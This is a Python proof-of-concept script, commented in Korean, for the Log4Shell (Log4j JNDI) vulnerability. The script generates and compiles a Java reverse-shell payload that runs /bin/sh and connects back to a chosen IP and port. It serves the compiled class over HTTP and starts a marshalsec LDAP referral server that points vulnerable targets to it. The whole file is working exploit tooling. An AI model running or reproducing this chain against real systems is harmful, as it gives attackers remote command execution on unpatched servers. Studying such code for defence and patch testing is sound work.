import subprocess
import threading
import argparse
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
import os

WORK_DIR = Path(__file__).parent.resolve()

def create_java_payload(target_ip, target_port):
    """Java 리버스 셸 페이로드 생성"""
    payload_code = f"""
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Payload {{
    public Payload() throws Exception {{
        String host="{target_ip}";
        int port={target_port};
        String shell="/bin/sh";
        Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();
        Socket socket = new Socket(host, port);
        InputStream processInput = process.getInputStream(), processError = process.getErrorStream(), socketInput = socket.getInputStream();
        OutputStream processOutput = process.getOutputStream(), socketOutput = socket.getOutputStream();
        while (!socket.isClosed()) {{
            while (processInput.available() > 0) socketOutput.write(processInput.read());
            while (processError.available() > 0) socketOutput.write(processError.read());
            while (socketInput.available() > 0) processOutput.write(socketInput.read());
            socketOutput.flush();
            processOutput.flush();
            Thread.sleep(50);
            try {{
                process.exitValue();
                break;
            }} catch (Exception e) {{}}
        }}
        process.destroy();
        socket.close();
    }}
}}
"""
    # Java 파일 생성 및 컴파일
    java_file = WORK_DIR / "Payload.java"
    with java_file.open("w") as f:
        f.write(payload_code)
    print("! Payload.java 파일 생성 완료")
    
    subprocess.run(["javac", str(java_file)], check=True)
    print("! Payload.java 컴파일 성공")


def launch_http_server(port):
    """HTTP 서버 시작"""
    print(f"! HTTP 서버 시작 중 - 포트 {port}")
    http_server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    http_server.serve_forever()


def launch_ldap_server(target_ip, http_port):
    """LDAP 서버 설정"""
    print(f"! LDAP 서버 시작: http://{target_ip}:{http_port}/#Payload")
    jar_path = os.path.join(os.path.dirname(__file__), 'target', 'marshalsec-0.0.3-SNAPSHOT-all.jar')
    
    if not os.path.exists(jar_path):
        print(f"? JAR 파일을 찾을 수 없습니다. 경로: {jar_path}")
        return
    
    ldap_ref_server_class = "marshalsec.jndi.LDAPRefServer"
    payload_url = f"http://{target_ip}:{http_port}/#Payload"
    
    ldap_cmd = [
        "java", "-cp", jar_path, ldap_ref_server_class, payload_url
    ]
    
    try:
        subprocess.run(ldap_cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"? LDAP server를 시작하는 데에 에러가 발생했습니다. : {e}")
        
    subprocess.run(ldap_cmd, check=True)


def main():
    parser = argparse.ArgumentParser(description="Log4Shell 개념 증명 코드")
    parser.add_argument("--targetip", required=True, help="리버스 셸 IP 주소")
    parser.add_argument("--httpport", type=int, default=8080, help="HTTP 서버 포트")
    parser.add_argument("--listenport", type=int, default=9090, help="리버스 셸 포트")
    args = parser.parse_args()

    # Java 페이로드 생성 및 컴파일
    create_java_payload(args.targetip, args.listenport)

    # HTTP 및 LDAP 서버 시작
    threading.Thread(target=launch_http_server, args=(args.httpport,)).start()
    threading.Thread(target=launch_ldap_server, args=(args.targetip, args.httpport)).start()


if __name__ == "__main__":
    main()
